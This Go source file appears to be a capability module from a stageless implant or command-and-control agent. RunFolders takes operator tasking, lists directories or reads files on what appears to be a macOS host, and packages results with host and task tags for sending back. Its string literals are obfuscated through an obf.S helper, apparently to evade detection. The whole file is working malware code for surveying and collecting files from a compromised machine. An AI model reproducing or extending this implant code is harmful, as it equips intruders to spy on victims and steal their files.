package capabilities

import (
	"encoding/json"
	"fmt"
	"strings"

	general "stageless/utils/general"
	"stageless/utils/macapi"
	"stageless/utils/obf"
)

func hasGetContent(parameters string) bool {
	// Checks that the parameters request file content
	if parameters == "" {
		return false
	}
	var parsed any
	if err := json.Unmarshal([]byte(parameters), &parsed); err != nil {
		return false
	}
	obj, ok := parsed.(map[string]any)
	if !ok {
		if s, ok := parsed.(string); ok {
			if err := json.Unmarshal([]byte(s), &obj); err != nil {
				return false
			}
		} else {
			return false
		}
	}
	v, ok := obj[obf.S("getContent")]
	if !ok || v == nil {
		return false
	}
	b, ok := v.(bool)
	return ok && b
}

func cleanPath(path string) string {
	// Only sanitizes a path string
	s := strings.TrimSpace(strings.ReplaceAll(path, "\\", macapi.PathSep))
	for len(s) > 1 && strings.HasSuffix(s, "/") {
		s = strings.TrimRight(s, "/")
	}
	return s
}

func isRootRequest(path string) bool {
	// Checks that the path asks for the root listing
	s := strings.TrimSpace(path)
	return s == "" || s == macapi.PathSep || s == "\\" || s == " "
}

func entryJSON(basePath string, ent macapi.DirEntry) map[string]any {
	// Builds a map for one directory entry
	full := macapi.JoinPath(basePath, ent.Name)
	last := macapi.FormatPathDate(full)
	size := ""
	if ent.IsDir {
		size = fmt.Sprintf("%d", macapi.CountDirEntries(full))
	} else if sz := macapi.GetPathSize(full); sz < 0 {
		size = obf.S("?")
	} else {
		size = general.FmtSize(uint64(sz))
	}
	typ := obf.S("file")
	if ent.IsDir {
		typ = obf.S("folder")
	}
	return map[string]any{
		obf.S("path"):     full,
		obf.S("lastEdit"): last,
		obf.S("type"):     typ,
		obf.S("size"):     size,
	}
}

func listPath(path string) []map[string]any {
	// Lists the entries under a path
	base := cleanPath(path)
	dir := base
	if dir == "" {
		dir = macapi.PathSep
	}
	out := make([]map[string]any, 0)
	for _, ent := range macapi.ListDirEntries(dir) {
		bp := base
		if bp == "" {
			bp = macapi.PathSep
		}
		out = append(out, entryJSON(bp, ent))
	}
	return out
}

func RunFolders(host, taskTag, input, params string) []byte {
	// Main function that lists a folder or reads a file
	if hasGetContent(params) {
		return RunFiles(host, taskTag, input, params)
	}
	raw := strings.TrimSpace(input)
	if isRootRequest(raw) {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     obf.S("folders"),
			obf.S("host"):     host,
			obf.S("task_tag"): taskTag,
			obf.S("content"):  listPath(macapi.PathSep),
		})
		return WriteMsg(msg)
	}
	inputPath := cleanPath(raw)
	if !macapi.PathExists(inputPath) || !macapi.PathIsDir(inputPath) {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     obf.S("folders"),
			obf.S("host"):     host,
			obf.S("task_tag"): taskTag,
			obf.S("error"):    obf.S("Path does not exist"),
		})
		return WriteMsg(msg)
	}
	msg := general.MarshalJSON(map[string]any{
		obf.S("option"):   obf.S("output"),
		obf.S("type"):     obf.S("folders"),
		obf.S("host"):     host,
		obf.S("task_tag"): taskTag,
		obf.S("content"):  listPath(inputPath),
	})
	return WriteMsg(msg)
}
